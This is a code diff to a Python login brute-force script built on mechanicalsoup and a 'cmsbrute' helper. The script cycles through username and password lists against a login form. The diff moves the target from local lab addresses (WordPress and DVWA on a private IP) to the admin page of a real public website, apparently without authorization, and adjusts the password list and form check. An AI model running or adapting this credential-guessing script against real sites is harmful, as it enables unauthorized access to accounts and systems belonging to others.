@@ -2,9 +2,10 @@ import mechanicalsoup
 from cmsbrute import core
 
 # URL = "http://192.168.56.103/wordpress/wp-login.php"
-URL = "http://192.168.56.103/dvwa/login.php"
+# URL = "http://192.168.56.103/dvwa/login.php"
+URL = "http://timbus.vn/admin/"
 usrlist = ["user", "admin"]
-passlist = ["user", "admin", "password"]
+passlist = ["admin", "password", "12341234"]
 # CHECK FOR LOGIN FORM
 browser = mechanicalsoup.StatefulBrowser()
 browser.open(URL)
@@ -31,7 +32,7 @@ else:
 			# check condition here
 			try:
 				# HAS FORM
-				check_form = core.getLoginForm(browser, frmID = formID)
+				check_form = core.getLoginForm(browser)
 				if not check_form:
 					print("Found: [%s:%s]" %(username, password))
 					break
